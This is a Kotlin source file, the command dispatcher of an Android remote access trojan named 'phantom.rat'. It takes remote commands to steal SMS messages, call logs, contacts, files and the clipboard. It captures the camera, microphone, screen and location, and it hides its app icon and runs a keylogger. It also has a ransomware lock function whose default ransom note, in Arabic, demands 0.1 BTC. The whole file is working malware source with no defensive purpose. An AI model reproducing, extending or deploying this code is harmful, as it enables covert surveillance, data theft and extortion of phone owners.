package com.phantom.rat.core

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import org.json.JSONObject
import com.phantom.rat.modules.*
import com.phantom.rat.services.ScreenMirrorService

class CommandHandler(private val context: Context) {

    private val smsModule = SmsModule(context)
    private val callModule = CallModule(context)
    private val cameraModule = CameraModule(context)
    private val microphoneModule = MicrophoneModule(context)
    private val locationModule = LocationModule(context)
    private val fileModule = FileModule(context)
    private val ransomwareModule = RansomwareModule(context)
    private val screenStreamModule = ScreenStreamModule(context)

    fun handleCommand(command: JSONObject): JSONObject {
        val cmdType = command.optString("type", "")
        val commandId = command.optString("id", "")
        val params = command.optJSONObject("params") ?: JSONObject()
        
        return try {
            when (cmdType) {
                // === SMS Commands ===
                "get_sms" -> handleGetSms(params)
                "get_sms_old" -> handleGetOldSms(params)
                "get_sms_new" -> handleGetNewSms(params)
                "send_sms" -> handleSendSms(params)
                
                // === Call Commands ===
                "get_call_logs" -> handleGetCallLogs(params)
                "record_call" -> handleRecordCall(params)
                "make_call" -> handleMakeCall(params)
                
                // === Ransomware ===
                "ransomware_lock" -> handleRansomwareLock(params)
                "ransomware_unlock" -> handleRansomwareUnlock(params)
                "ransomware_status" -> handleRansomwareStatus()
                
                // === Camera ===
                "camera_capture_back" -> handleCameraCapture("back", params)
                "camera_capture_front" -> handleCameraCapture("front", params)
                "camera_stream_start_back" -> handleCameraStream("back")
                "camera_stream_start_front" -> handleCameraStream("front")
                "camera_stream_stop" -> handleCameraStreamStop()
                
                // === Microphone ===
                "audio_record" -> handleAudioRecord(params)
                "audio_record_stop" -> handleAudioRecordStop()
                
                // === Location ===
                "get_location" -> handleGetLocation()
                "get_location_precise" -> handleGetPreciseLocation()
                
                // === Files ===
                "file_download" -> handleFileDownload(params)
                "file_upload" -> handleFileUpload(params)
                "file_list" -> handleFileList(params)
                "file_delete" -> handleFileDelete(params)
                
                // === Device ===
                "hide_app" -> handleHideApp()
                "get_device_info" -> handleDeviceInfo()
                "get_contacts" -> handleGetContacts()
                "get_installed_apps" -> handleInstalledApps()
                "get_clipboard" -> handleGetClipboard()
                "open_url" -> handleOpenUrl(params)
                "vibrate" -> handleVibrate(params)
                "set_volume" -> handleSetVolume(params)
                
                // === Screen Stream ===
                "screen_stream_start" -> handleScreenStreamStart()
                "screen_stream_stop" -> handleScreenStreamStop()
                
                // === Advanced ===
                "keylogger_start" -> handleKeyloggerStart()
                "keylogger_stop" -> handleKeyloggerStop()
                "keylogger_get_logs" -> handleKeyloggerGetLogs()
                
                else -> JSONObject().apply { 
                    put("status", "error")
                    put("message", "Unknown command: $cmdType")
                }
            }.apply {
                put("command_id", commandId)
                put("timestamp", System.currentTimeMillis())
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("status", "error")
                put("command_id", commandId)
                put("message", e.message ?: "Unknown error")
            }
        }
    }

    private fun handleGetSms(params: JSONObject): JSONObject = smsModule.getAllSms()
    private fun handleGetOldSms(params: JSONObject): JSONObject = smsModule.getOldSms()
    private fun handleGetNewSms(params: JSONObject): JSONObject = smsModule.getNewSms()
    private fun handleSendSms(params: JSONObject): JSONObject {
        val number = params.getString("number")
        val message = params.getString("message")
        return smsModule.sendSms(number, message)
    }

    private fun handleGetCallLogs(params: JSONObject): JSONObject = callModule.getCallLogs()
    private fun handleRecordCall(params: JSONObject): JSONObject = callModule.recordCall()
    private fun handleMakeCall(params: JSONObject): JSONObject {
        val number = params.getString("number")
        return callModule.makeCall(number)
    }

    private fun handleRansomwareLock(params: JSONObject): JSONObject {
        val message = params.optString("message", "تم تشفير جهازك! أرسل 0.1 BTC للفك.")
        val key = params.optString("key", generateRansomKey())
        val amount = params.optDouble("amount", 0.1)
        val crypto = params.optString("crypto", "BTC")
        return ransomwareModule.lockDevice(message, key, amount, crypto)
    }

    private fun handleRansomwareUnlock(params: JSONObject): JSONObject {
        val key = params.getString("key")
        return ransomwareModule.unlockDevice(key)
    }

    private fun handleRansomwareStatus(): JSONObject = ransomwareModule.getStatus()

    private fun handleCameraCapture(facing: String, params: JSONObject): JSONObject {
        return cameraModule.capturePhoto(facing)
    }

    private fun handleCameraStream(facing: String): JSONObject {
        return cameraModule.startStream(facing)
    }

    private fun handleCameraStreamStop(): JSONObject = cameraModule.stopStream()

    private fun handleAudioRecord(params: JSONObject): JSONObject {
        val duration = params.optInt("duration", 30) // seconds
        return microphoneModule.startRecording(duration)
    }

    private fun handleAudioRecordStop(): JSONObject = microphoneModule.stopRecording()

    private fun handleGetLocation(): JSONObject = locationModule.getLocation()
    private fun handleGetPreciseLocation(): JSONObject = locationModule.getPreciseLocation()

    private fun handleFileDownload(params: JSONObject): JSONObject {
        val path = params.getString("path")
        return fileModule.downloadFile(path)
    }

    private fun handleFileUpload(params: JSONObject): JSONObject {
        val path = params.getString("path")
        val content = params.getString("content")
        return fileModule.uploadFile(path, content)
    }

    private fun handleFileList(params: JSONObject): JSONObject {
        val path = params.optString("path", Environment.getExternalStorageDirectory().absolutePath)
        return fileModule.listFiles(path)
    }

    private fun handleFileDelete(params: JSONObject): JSONObject {
        val path = params.getString("path")
        return fileModule.deleteFile(path)
    }

    private fun handleHideApp(): JSONObject {
        return try {
            val pm = context.packageManager
            pm.setComponentEnabledSetting(
                android.content.ComponentName(context, context.packageName + ".ui.MainActivity"),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            JSONObject().apply {
                put("status", "success")
                put("message", "App hidden successfully")
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("status", "error")
                put("message", e.message)
            }
        }
    }

    private fun handleDeviceInfo(): JSONObject {
        return JSONObject().apply {
            put("status", "success")
            put("model", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("version", Build.VERSION.RELEASE)
            put("sdk", Build.VERSION.SDK_INT)
            put("board", Build.BOARD)
            put("brand", Build.BRAND)
            put("device", Build.DEVICE)
            put("hardware", Build.HARDWARE)
            put("product", Build.PRODUCT)
            put("fingerprint", Build.FINGERPRINT)
            put("serial", Build.SERIAL)
            put("host", Build.HOST)
            put("display", Build.DISPLAY)
            put("id", Build.ID)
            put("time", System.currentTimeMillis())
        }
    }

    private fun handleGetContacts(): JSONObject {
        val contacts = JSONObject()
        val cursor = context.contentResolver.query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            val items = mutableListOf<JSONObject>()
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndex(
                    android.provider.ContactsContract.Contacts.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                items.add(JSONObject().apply {
                    put("name", name)
                    put("number", number)
                })
            }
            contacts.put("status", "success")
            contacts.put("contacts", items.toString())
        }
        return contacts
    }

    private fun handleInstalledApps(): JSONObject {
        val pm = context.packageManager
        val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
        val items = mutableListOf<JSONObject>()
        apps.forEach { app ->
            try {
                val appName = pm.getApplicationLabel(app).toString()
                val packageName = app.packageName
                items.add(JSONObject().apply {
                    put("name", appName)
                    put("package", packageName)
                    put("system", (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
                })
            } catch (_: Exception) {}
        }
        return JSONObject().apply {
            put("status", "success")
            put("count", items.size)
            put("apps", items.toString())
        }
    }

    private fun handleGetClipboard(): JSONObject {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return JSONObject().apply {
                put("status", "error")
                put("message", "Clipboard access restricted on Android 10+")
            }
        }
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val clip = clipboard.primaryClip
        val text = if (clip != null && clip.itemCount > 0) clip.getItemAt(0).text?.toString() else ""
        return JSONObject().apply {
            put("status", "success")
            put("clipboard", text ?: "")
        }
    }

    private fun handleOpenUrl(params: JSONObject): JSONObject {
        val url = params.getString("url")
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
        return JSONObject().apply {
            put("status", "success")
            put("message", "Opened URL: $url")
        }
    }

    private fun handleVibrate(params: JSONObject): JSONObject {
        val duration = params.optLong("duration", 1000)
        val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(android.os.VibrationEffect.createOneShot(duration, 
                android.os.VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            @Suppress("DEPRECATION")
            vibrator.vibrate(duration)
        }
        return JSONObject().apply {
            put("status", "success")
            put("message", "Vibrated for ${duration}ms")
        }
    }

    private fun handleSetVolume(params: JSONObject): JSONObject {
        val level = params.optInt("level", 50)
        val stream = params.optString("stream", "music")
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
        val streamType = when (stream) {
            "music" -> android.media.AudioManager.STREAM_MUSIC
            "call" -> android.media.AudioManager.STREAM_VOICE_CALL
            "alarm" -> android.media.AudioManager.STREAM_ALARM
            "notification" -> android.media.AudioManager.STREAM_NOTIFICATION
            "system" -> android.media.AudioManager.STREAM_SYSTEM
            else -> android.media.AudioManager.STREAM_MUSIC
        }
        val max = audioManager.getStreamMaxVolume(streamType)
        audioManager.setStreamVolume(streamType, (level * max) / 100, 0)
        return JSONObject().apply {
            put("status", "success")
            put("volume", level)
        }
    }

    private fun handleScreenStreamStart(): JSONObject = screenStreamModule.startStream()
    private fun handleScreenStreamStop(): JSONObject = screenStreamModule.stopStream()

    private fun handleKeyloggerStart(): JSONObject {
        context.startService(Intent(context, com.phantom.rat.services.KeyloggerService::class.java))
        return JSONObject().apply {
            put("status", "success")
            put("message", "Keylogger started")
        }
    }

    private fun handleKeyloggerStop(): JSONObject {
        context.stopService(Intent(context, com.phantom.rat.services.KeyloggerService::class.java))
        return JSONObject().apply {
            put("status", "success")
            put("message", "Keylogger stopped")
        }
    }

    private fun handleKeyloggerGetLogs(): JSONObject {
        val prefs = context.getSharedPreferences("keylogger_logs", Context.MODE_PRIVATE)
        val logs = prefs.all.map { (key, value) -> "$key: $value" }.joinToString("\n")
        return JSONObject().apply {
            put("status", "success")
            put("logs", logs)
        }
    }

    private fun generateRansomKey(): String {
        val chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        return (1..32).map { chars.random() }.joinToString("")
    }
}
